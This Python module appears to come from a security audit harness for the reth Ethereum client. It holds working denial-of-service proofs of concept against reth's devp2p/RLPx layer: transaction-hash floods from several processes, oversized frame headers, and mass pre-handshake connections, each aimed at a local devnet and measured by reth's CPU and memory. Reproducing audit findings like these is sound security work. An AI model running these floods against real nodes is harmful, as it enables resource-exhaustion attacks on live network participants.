"""Reusable devp2p probes against reth — AUDIT-001 / WIRE-003 / RLPX-002 / RLPX-003.

The canonical report bundles now live under `reports/<client>/poc/<id>/`.
This module keeps the reusable RLPx/session helpers and legacy per-surface
entrypoints for compatibility. It uses the from-scratch RLPx stack in
`harness/drivers/rlpx` to reach an active eth session with real reth, then
drives the finding's attack and samples reth via `docker stats`.
"""

from __future__ import annotations

import os
import socket
import sys
import time

from ..devnet.kurtosis import KurtosisHarness
from ..drivers import wire
from ..drivers.rlpx.frame import HEADER_DATA
from ..drivers.rlpx.session import ETH_NEW_BLOCK_HASHES, ETH_NEW_POOLED_TX_HASHES, MSG_DISCONNECT, Session
from .discover import discover_reth

SVC = "el-1-reth-lighthouse"


def _rss():
    return max(s.rss_mb for s in KurtosisHarness(samples=2, interval=0.3).sample_service("repro-reth", SVC))


def _cpu_rss():
    s = KurtosisHarness(samples=3, interval=0.4).sample_service("repro-reth", SVC)
    return max(x.cpu_pct for x in s), max(x.rss_mb for x in s)


def audit_001_flood(t, n_proc=8, n_hash=450_000, seconds=30):
    """AUDIT-001: multi-process NewPooledTransactionHashes flood; watch reth CPU."""
    import multiprocessing as mp
    import time

    from ..drivers.payloads import _compressible_unique_txhash

    def worker(counter, stop, pub_hex, port, worker_index):
        s = Session("127.0.0.1", port, bytes.fromhex(pub_hex))
        s.handshake(timeout=10)
        s.sock.settimeout(0.005)
        msg_index = 0
        while not stop.value:
            msg = wire.encode_new_pooled_transaction_hashes_68([
                _compressible_unique_txhash(worker_index * 10_000_000 + msg_index * n_hash + i)
                for i in range(n_hash)
            ])
            try:
                s.write_msg(ETH_NEW_POOLED_TX_HASHES, msg)
            except Exception:
                break
            with counter.get_lock():
                counter.value += n_hash
            msg_index += 1
            try:
                while True:
                    s.sock.recv(65536)
            except Exception:
                pass

    base = _cpu_rss()
    counter, stop = mp.Value("q", 0), mp.Value("b", 0)
    procs = [
        mp.Process(target=worker, args=(counter, stop, t.pubkey.hex(), t.p2p_port, i))
        for i in range(n_proc)
    ]
    for p in procs:
        p.start()
    time.sleep(seconds)
    during = _cpu_rss()
    stop.value = 1
    for p in procs:
        p.join(timeout=2)
    rate = counter.value / seconds
    print(f"[AUDIT-001] {counter.value} hashes ({rate/1000:.0f}k/s); reth cpu {base[0]:.0f}%->{during[0]:.0f}% rss {base[1]:.0f}->{during[1]:.0f}MiB")


def wire_003_newblockhashes(t):
    """WIRE-003: a single NewBlockHashes — reth disconnects (forbidden post-merge)."""
    s = Session("127.0.0.1", t.p2p_port, t.pubkey)
    s.handshake(timeout=10)
    s.write_msg(ETH_NEW_BLOCK_HASHES, wire.encode_new_block_hashes([(os.urandom(32), i) for i in range(1000)]))
    s.sock.settimeout(4)
    mid, _ = s.read_msg()
    print(f"[WIRE-003] reth replied msg 0x{mid:02x}" + (" = DISCONNECT (breach of protocol)" if mid == MSG_DISCONNECT else ""))
    s.close()


def rlpx_002_oversized_frame(t, n=30):
    """RLPX-002: post-handshake frame header declaring a 16 MiB body, no body."""
    base = _rss()
    conns = []
    for _ in range(n):
        s = Session("127.0.0.1", t.p2p_port, t.pubkey)
        s.connect(timeout=8)
        header = ((0xFFFFFF).to_bytes(3, "big") + HEADER_DATA).ljust(16, b"\x00")
        hct = s.codec.enc.update(header)
        s.sock.sendall(hct + s.codec.egress_mac.header(hct))
        conns.append(s)
    time.sleep(2)
    print(f"[RLPX-002] {n} conns declaring 16 MiB body; reth rss {base:.0f}->{_rss():.0f}MiB (expect ~+{16*n} if reserved)")
    for s in conns:
        s.close()


def rlpx_003_pre_handshake(t, n=1500):
    """RLPX-003: raw TCP 0xFFFF auth prefix (pre-ECIES); held connections."""
    base = _rss()
    socks = []
    for _ in range(n):
        try:
            sk = socket.create_connection(("127.0.0.1", t.p2p_port), timeout=5)
            sk.sendall(b"\xff\xff" + b"\x00" * 64)
            socks.append(sk)
        except Exception:
            pass
    time.sleep(3)
    print(f"[RLPX-003] {len(socks)} raw conns w/ 0xFFFF prefix; reth rss {base:.0f}->{_rss():.0f}MiB (expect ~+{65537*n//1024//1024} if reserved)")
    for sk in socks:
        sk.close()


if __name__ == "__main__":
    t = discover_reth()
    if t is None:
        print("no repro-reth devnet; boot it first (see harness/probes/README.md)")
        sys.exit(1)
    which = sys.argv[1] if len(sys.argv) > 1 else "all"
    if which in ("all", "wire003"):
        wire_003_newblockhashes(t)
    if which in ("all", "rlpx002"):
        rlpx_002_oversized_frame(t)
    if which in ("all", "rlpx003"):
        rlpx_003_pre_handshake(t)
    if which in ("all", "audit001"):
        audit_001_flood(t)
